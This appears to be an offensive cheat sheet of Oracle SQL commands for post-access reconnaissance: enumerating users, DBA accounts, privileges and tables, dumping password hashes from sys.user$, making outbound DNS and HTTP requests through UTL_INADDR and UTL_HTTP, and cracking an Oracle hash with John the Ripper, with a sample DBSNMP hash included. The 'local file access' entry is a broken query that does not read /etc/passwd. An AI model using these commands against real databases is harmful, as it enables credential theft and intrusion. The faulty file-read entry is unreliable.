

##-==========================================-##
##   [+] Oracle - Check Version : 
##-==========================================-##
SELECT banner FROM v$version WHERE banner LIKE 'Oracle%'; 
SELECT banner FROM v$version WHERE banner LIKE 'TNS%';
SELECT version FROM v$instance;


##-==========================================-##
##   [+] Oracle - Current User :
##-==========================================-##
SELECT user FROM dual;


##-==========================================-##
##   [+] Oracle - List Users:
##-==========================================-##
SELECT username FROM all_users ORDER BY username;
SELECT name FROM sys.user$;
SELECT name, password from sys.user$;
SELECT name, spare4 from sys.user$;
select username,account_status,created,profile FROM sys.dba_users ORDER BY username;


##-==========================================-##
##   [+] Oracle - List Password Hashes：
##-==========================================-##
SELECT name, password, astatus FROM sys.user$;  
SELECT name,spare4 FROM sys.user$ where rownum <= 10; 


##-==========================================-##
##   [+] Oracle - Current Database:
##-==========================================-##
SELECT global_name FROM global_name;
SELECT name FROM v database; 
SELECT instance_name FROM v$instance;
SELECT SYS.DATABASE_NAME FROM DUAL;


##-==========================================-##
##   [+] Oracle - List Databases：
##-==========================================-##
SELECT DISTINCT owner FROM all_tables;


##-==========================================-##
##   [+] Oracle - List DBA Accounts:
##-==========================================-##
SELECT DISTINCT grantee FROM dba_sys_privs WHERE ADMIN_OPTION = 'YES';


##-==========================================-##
##   [+] Oracle - List Columns :
##-==========================================-##
SELECT column_name FROM all_tab_columns WHERE table_name = 'blah';
SELECT column_name FROM all_tab_columns WHERE table_name = 'blah' and owner = 'foo';


##-==========================================-##
##   [+] Oracle - Tables:
##-==========================================-##
SELECT table_name FROM all_tables;
SELECT owner, table_name FROM all_tables;


##-==========================================-##
##   [+] Oracle - Tables From Column Name	 :
##-==========================================-##
SELECT owner, table_name FROM all_tab_columns WHERE column_name LIKE '%PASS%';


##-==========================================-##
##   [+] Oracle - Privileges :
##-==========================================-##
SELECT * FROM session_privs;(Retrieves Current Privs)
SELECT * FROM dba_sys_privs WHERE grantee = 'DBSNMP';
SELECT grantee FROM dba_sys_privs WHERE privilege = 'SELECT ANY DICTIONARY';
SELECT GRANTEE, GRANTED_ROLE FROM DBA_ROLE_PRIVS;


##-==========================================-##
##   [+] Oracle - Location of DB Files:
##-==========================================-##
SELECT name FROM V$DATAFILE;


## --------------------------------------------------- ##
##   [?] First create a normal user and authorize:
## --------------------------------------------------- ##
##   [?] create user yang identified by yang;  
##   [?] grant connect, resource to yang; 
## --------------------------------------------------- ##


##-==========================================-##
##   [+] Oracle - Make DNS Requests：
##-==========================================-##
SELECT UTL_INADDR.get_host_address('www.baidu.com') FROM dual; 
SELECT UTL_HTTP.REQUEST('http://www.baidu.com/') FROM dual;


##-==========================================-##
##   [+] Oracle - Local File Access：
##-==========================================-##
SELECT value FROM v$parameter2 WHERE name = '/etc/passwd'; 


##-==========================================-##
##   [+] Oracle - Hostname, IP Address：
##-==========================================-##
SELECT host_name FROM v$instance; 
SELECT UTL_INADDR.get_host_name('192.168.1.103') FROM dual; 


##-======================================================================-##
##   [+] Oracle - John the Ripper - Brute Force Oracle Password Hash:
##-======================================================================-##
## ---------------------------------------------------------------------------- ##
##   [?] DBSNMP:BA054BE9241074F8437B47B98B9298F6063561403341EA94F595D242183E
## ---------------------------------------------------------------------------- ##
john --format=oracle11 /tmp/orahash.txt


